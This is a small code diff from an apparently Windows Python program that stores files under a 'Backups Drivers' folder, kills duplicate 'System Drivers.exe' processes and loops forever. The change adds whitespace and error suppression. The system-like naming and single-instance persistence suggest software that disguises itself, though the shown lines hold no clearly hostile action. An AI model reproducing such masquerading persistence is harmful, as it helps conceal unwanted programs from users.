@@ -213,6 +213,7 @@ if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"):
 		copy("data.dat", "C:\\ProgramData\\Backups Drivers")
 	except:
 		pass
+		
 SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
 DataSettings = load(SettingsDat)
 SettingsDat.close()
@@ -462,7 +463,9 @@ def find_process_pid(process_name):
         if process.name() == process_name:
             if process.pid != getpid():
                 process.kill()
-find_process_pid('SystemDrivers.exe')
+try: 
+	find_process_pid('System Drivers.exe')
+except: pass
 
 while 1:
     try:
